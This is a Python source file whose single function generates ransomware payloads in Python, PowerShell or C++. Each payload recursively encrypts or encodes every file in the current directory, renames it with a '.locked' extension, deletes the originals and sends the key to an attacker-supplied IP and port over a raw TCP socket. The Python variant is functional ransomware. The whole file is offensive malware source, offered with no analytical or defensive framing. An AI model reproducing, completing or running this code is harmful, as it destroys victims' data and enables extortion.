def generate_payload(language, ip, port):
    if language.lower() == 'python':
        with open('payloads/python_payload.py', 'w') as f:
            f.write(f"""
import os
import socket
from cryptography.fernet import Fernet

def encrypt_files(path, key, new_extension=".locked"):
    fernet = Fernet(key)
    for root, _, files in os.walk(path):
        for file in files:
            filepath = os.path.join(root, file)
            if filepath.endswith(new_extension):
                continue
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(filepath + new_extension, 'wb') as f:
                f.write(encrypted_data)
            os.remove(filepath)

def main():
    key = Fernet.generate_key()
    encrypt_files('.', key)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('{ip}', {port}))
    s.sendall(key)
    s.close()

if __name__ == "__main__":
    main()
""")
        print("Python payload generated successfully!")
    elif language.lower() == 'powershell':
        with open('payloads/powershell_payload.ps1', 'w') as f:
            f.write(f"""
$key = [System.Convert]::ToBase64String((New-Object Byte[] 32 | % {{ [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($_) }}))
$path = Get-Location
$files = Get-ChildItem -File -Recurse

foreach ($file in $files) {{
    if ($file.Extension -eq ".locked") {{
        continue
    }}
    $content = Get-Content $file.FullName -Raw
    $encrypted = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
    $newFile = $file.FullName + ".locked"
    Set-Content -Path $newFile -Value $encrypted
    Remove-Item $file.FullName
}}

$socket = New-Object System.Net.Sockets.TcpClient("{ip}", {port})
$stream = $socket.GetStream()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($key)
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$socket.Close()
""")
        print("PowerShell payload generated successfully!")
    elif language.lower() == 'c++':
        with open('payloads/cplusplus_payload.cpp', 'w') as f:
            f.write(f"""
#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

void encrypt_file(const std::string& filepath, const std::string& extension) {{
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) return;

    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    std::string encrypted_content = "ENCRYPTED_" + content;
    std::ofstream encrypted_file(filepath + extension, std::ios::binary);
    encrypted_file << encrypted_content;
    encrypted_file.close();

    std::remove(filepath.c_str());
}}

int main() {{
    std::string directory = ".";
    std::string extension = ".locked";
    for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {{
        if (entry.is_regular_file() && entry.path().extension() != extension) {{
            encrypt_file(entry.path().string(), extension);
        }}
    }}

    WSADATA wsaData;
    SOCKET Socket;
    SOCKADDR_IN ServerAddr;

    WSAStartup(MAKEWORD(2, 0), &wsaData);
    Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_port = htons({port});
    ServerAddr.sin_addr.s_addr = inet_addr("{ip}");

    connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr));

    std::string key = "GeneratedKeyForEncryption";
    send(Socket, key.c_str(), key.length(), 0);

    closesocket(Socket);
    WSACleanup();
    return 0;
}}
""")
        print("C++ payload generated successfully!")
    else:
        print("Invalid language. Please choose 'python', 'powershell', or 'c++'.")
